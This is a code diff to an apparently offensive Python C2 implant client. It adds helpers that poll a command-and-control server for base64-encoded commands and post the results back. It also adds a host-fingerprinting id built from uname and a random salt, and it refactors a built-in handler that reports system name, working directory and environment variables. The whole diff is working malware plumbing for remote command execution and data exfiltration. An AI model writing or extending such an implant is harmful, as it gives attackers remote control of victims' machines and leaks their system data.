@@ -23,6 +23,8 @@ password = "password"
 HOST, PORT = "0.0.0.0", 9998
 debug = True
 
+c2_id = 0
+
 
 def handle(data):
 	"""
@@ -50,15 +52,41 @@ def handle(data):
 	send_data(output)
 
 
+def make_get(url):
+	"""
+	Make Get request to C2 server
+	Args:
+		url: url of resource
+
+	Returns: the data decoded from base64
+
+	"""
+	r = requests.get(f"http://{HOST}:{PORT}/{url}")
+	return base64.urlsafe_b64decode(bytes(r.text.encode('utf-8'))).decode('utf-8')
+
+
+def make_post(url, data):
+	"""
+	Make Post request to C2 server
+	Args:
+		url: resource
+		data: data, not encoded
+
+	Returns: status code and response text
+
+	"""
+	data = base64.urlsafe_b64encode(bytes(data.encode('utf-8')))
+	r = requests.post(f"http://{HOST}:{PORT}/{url}", data=data)
+	return r.status_code, r.text
+
+
 def request_commands():
 	"""
 	Make HTTP request
 
-	Returns: the
+	Returns: the polling status and commands to execute
 	"""
-	r = requests.get(f"http://{HOST}:{PORT}/commands")
-
-	data = base64.urlsafe_b64decode(bytes(r.text.encode('utf-8'))).decode('utf-8').split()
+	data = make_get("commands").split()
 	return data[0], data[1:]
 
 
@@ -71,9 +99,27 @@ def send_data(data):
 	Returns:
 
 	"""
-	data = base64.urlsafe_b64encode(bytes(data.encode('utf-8')))
-	r = requests.post(f"http://{HOST}:{PORT}/data", data=data)
-	return r.status_code
+	status, _ = make_post("data", data)
+	return status
+
+
+def get_uname():
+	"""
+	Generate uname string
+
+	Returns: the string containing uname string
+	"""
+	return f"{os.uname().sysname} {os.uname().release} {os.uname().version} {os.uname().machine}"
+
+
+def generate_id():
+	"""
+	Generate a numerical id based on the uname and a random salt
+	Returns:
+
+	"""
+	global c2_id
+	c2_id = int(hashlib.sha1(get_uname().encode("utf-8")).hexdigest(), 16) + random.randint(1, 10000)
 
 
 def run_builtin(command):
@@ -86,7 +132,7 @@ def run_builtin(command):
 
 	"""
 	if command == "name":
-		return f"{os.uname().sysname} {os.uname().release} {os.uname().version} {os.uname().machine}"
+		return get_uname()
 	elif command == "cwd":
 		return os.getcwd()
 	elif command == "env":
